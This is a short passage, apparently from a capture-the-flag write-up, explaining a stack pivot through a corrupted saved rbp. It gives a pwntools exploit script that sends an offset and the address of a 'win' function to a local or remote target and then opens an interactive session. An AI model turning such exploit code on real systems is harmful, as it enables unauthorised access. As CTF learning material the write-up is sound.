RSP will take the value of the corrupted saved rbp value and returning over controlled data during the epilog of main.
```
#!/usr/bin/python3

from pwn import *
from sys import argv

elf = ELF('./exe')

REMOTE = len(argv) == 3
if REMOTE:
    HOSTNAME = argv[1]
    PORT = int(argv[2]) 
DEBUG = not REMOTE

context.arch = 'amd64'
  
def get_remote():
    return remote(HOSTNAME, PORT) if REMOTE else elf.process()

r = get_remote()

offset = 0x28 * 8 + 6 #6th bit of saved rbp

r.sendlineafter(b'? ', str(offset).encode().ljust(8, b'\x00') + p64(elf.sym['win']))

r.interactive()
```
